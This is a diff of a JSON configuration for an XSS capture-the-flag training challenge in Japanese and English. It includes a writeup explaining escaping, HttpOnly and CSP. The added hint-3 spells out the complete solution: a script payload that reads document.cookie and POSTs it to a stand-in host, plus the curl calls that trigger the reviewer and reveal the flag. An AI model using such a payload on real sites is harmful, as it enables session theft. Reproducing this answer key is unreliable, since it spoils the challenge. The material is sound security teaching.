@@ -13,7 +13,7 @@
     "chapter": "IPA §1.5 XSS"
   },
   "shortDescription": "スタッフ専用の社内掲示板。投稿を見たセキュリティ担当が持つ合言葉を、投稿の中身だけで奪い取れ。",
-  "instructions": "掲示板に投稿すると、 後でセキュリティ担当がその投稿を確認しに来る。 担当が確認した瞬間に手に入る合言葉 (`TC{...}`) をこのポータルに提出せよ。\n\n手がかりが欲しくなったら、 下のヒントを開こう (ヒントにはスコアのペナルティが付く)。",
+  "instructions": "掲示板に投稿すると、 後でセキュリティ担当がその投稿を確認しに来る。 担当が確認した瞬間に手に入る合言葉 (`TC{...}`) をこのポータルに提出せよ。\n\n投稿・巡回のリクエスト・監視ログの確認、 この 3 つの操作はどれも自分の手で行う必要がある (担当は自動では巡回しない)。\n\n手がかりが欲しくなったら、 下のヒントを開こう (ヒントにはスコアのペナルティが付く)。",
   "description": "あなたは、 ある会社のセキュリティ診断を任された。 対象は、 スタッフ専用の社内掲示板。\n\n投稿は誰でもできるが、 中身の閲覧や承認は「セキュリティ担当」が定期的に巡回して行う。 担当は自分のセッション情報 (ログイン状態) を持ったまま、 新しい投稿に目を通す。\n\nこの掲示板は前任のエンジニアが急ごしらえで作ったもので、 投稿内容の扱いがどこか雑だという噂がある。 担当のセッション情報を、 投稿の中身だけで奪い取れないか探ってみよう。",
   "writeup": "## 何が起きていたか\n\n掲示板は、 投稿された `message` をエスケープせず、 そのまま HTML に埋め込んで表示していた。 そこに `<script>` を含む投稿を送ると、 その投稿を閲覧した人 (ここではセキュリティ担当) のブラウザ上でスクリプトがそのまま実行される。\n\nこれは XSS (クロスサイト・スクリプティング) であり、 利用者の入力が「表示するデータ」ではなく「実行可能なコード」として解釈されたことが根本原因である。 スクリプトは閲覧者の権限で動くため、 閲覧者のセッション情報 (Cookie) を読み取り、 攻撃者の管理するサーバーへ送信 (exfiltration) できてしまう。\n\n## 直し方\n\n利用者が入力した文字列を HTML に埋め込む前に、 必ず HTML エスケープ (`<` → `&lt;` 等) する。 テンプレートエンジンの多くはデフォルトでこれを行うので、 生の文字列連結を避け、 エスケープ機構を無効化しない。 加えて Cookie に `HttpOnly` 属性を付けると、 たとえ XSS が起きてもスクリプトから Cookie を読めなくなる (多層防御)。 Content-Security-Policy でインラインスクリプトの実行自体を制限するのも有効な追加対策である。",
   "tags": [
@@ -43,7 +43,7 @@
     "en": {
       "name": "Breaking Into the Staff Bulletin Board",
       "shortDescription": "A staff-only bulletin board. A security reviewer checks new posts — steal the passphrase they hold, using nothing but a post's contents.",
-      "instructions": "After you post to the board, a security reviewer checks it later. The moment the reviewer checks your post, you can capture a passphrase (`TC{...}`). Submit it in this portal.\n\nIf you want a nudge, open the hints below (hints carry a score penalty).",
+      "instructions": "After you post to the board, a security reviewer checks it later. The moment the reviewer checks your post, you can capture a passphrase (`TC{...}`). Submit it in this portal.\n\nPosting, requesting the reviewer's pass, and checking the monitoring log are three separate steps you have to perform yourself — the reviewer does not crawl on its own.\n\nIf you want a nudge, open the hints below (hints carry a score penalty).",
       "description": "You have been asked to do a security assessment of a company. The target is a staff-only internal bulletin board.\n\nAnyone can post, but a \"security reviewer\" periodically reviews new posts. The reviewer carries their own session (their logged-in state) while reading posts.\n\nThe board was thrown together in a hurry by a previous engineer, and rumor has it that it is careless about how it handles post content. Find a way to steal the reviewer's session using nothing but a post's contents.",
       "writeup": "## What happened\n\nThe board spliced a post's `message` straight into the HTML it rendered, with no escaping. Submitting a post containing a `<script>` tag meant that script ran, unmodified, in the browser of whoever viewed that post next (here, the security reviewer).\n\nThis is XSS (cross-site scripting): untrusted input was interpreted as executable code instead of data to display. Because the script runs with the *viewer's* privileges, it can read the viewer's session (cookie) and exfiltrate it to a server the attacker controls.\n\n## How to fix it\n\nAlways HTML-escape user input (`<` → `&lt;`, etc.) before splicing it into a page. Most template engines do this by default — avoid raw string concatenation, and never disable the engine's escaping. Layer on `HttpOnly` for session cookies so a script cannot read them even if an XSS bug exists, and use a Content-Security-Policy to restrict inline script execution as further defense in depth.",
       "learningGoals": [
@@ -58,7 +58,11 @@
         },
         {
           "id": "hint-2",
-          "content": "Post a message containing a `<script>` tag. Whatever JavaScript is inside it will run in the reviewer's session when they check the board — including code that reads `document.cookie` and sends it somewhere. Check the reviewer's monitoring log afterward to see what got sent."
+          "content": "Post a message containing a `<script>` tag via `POST /post`. But the board does not crawl on its own — you have to trigger the security reviewer's pass yourself by calling `POST /admin/report`. Whatever JavaScript is inside your script tag runs in the reviewer's session the moment that pass happens — including code that reads `document.cookie` and sends it somewhere."
+        },
+        {
+          "id": "hint-3",
+          "content": "Here is the full sequence. (1) `curl -s http://127.0.0.1:18080/post --data-urlencode 'name=x' --data-urlencode 'message=<script>fetch(\"https://example.invalid/x\",{method:\"POST\",body:document.cookie})</script>'` to post the malicious message. (2) `curl -s -X POST http://127.0.0.1:18080/admin/report` to fire the security reviewer's pass (nothing happens until you call this). (3) `curl -s http://127.0.0.1:18080/admin/captured` — the captured request's body contains `session=TC{xss_...}`; that `TC{...}` value is the flag."
         }
       ]
     }
@@ -83,12 +87,17 @@
       {
         "id": "hint-1",
         "content": "自分の投稿がページ上でどう表示されるかをよく見てみよう。 `<` のような記号を入力したのに、 `&lt;` に変換されず そのまま出てくるなら、 その画面は入力をエスケープしていない。",
-        "penalty": 20
+        "penalty": 10
       },
       {
         "id": "hint-2",
-        "content": "`<script>` タグを含むメッセージを投稿してみよう。 中の JavaScript は、 セキュリティ担当が掲示板を確認したときに 担当のセッションの中で実行される ── `document.cookie` を読み取ってどこかへ送るコードも含めて。 その後、 担当側の監視ログを確認すると、 何が送信されたかが見える。",
-        "penalty": 30
+        "content": "`<script>` タグを含むメッセージを `POST /post` で投稿してみよう。 ただしこの掲示板は自動では巡回しない ── セキュリティ担当の巡回は `POST /admin/report` を呼んで自分で発火させる必要がある。 中の JavaScript は、 その巡回が走った瞬間に担当のセッションの中で実行される ── `document.cookie` を読み取ってどこかへ送るコードも含めて。",
+        "penalty": 15
+      },
+      {
+        "id": "hint-3",
+        "content": "手順をすべて示す。 (1) `curl -s http://127.0.0.1:18080/post --data-urlencode 'name=x' --data-urlencode 'message=<script>fetch(\"https://example.invalid/x\",{method:\"POST\",body:document.cookie})</script>'` で悪意ある投稿を送る。 (2) `curl -s -X POST http://127.0.0.1:18080/admin/report` でセキュリティ担当の巡回を発火させる (これを呼ばない限り担当は掲示板を見に来ない)。 (3) `curl -s http://127.0.0.1:18080/admin/captured` を確認すると、 捕捉されたリクエストの body に `session=TC{xss_...}` が含まれている ── その `TC{...}` の部分がフラグ。",
+        "penalty": 25
       }
     ]
   }
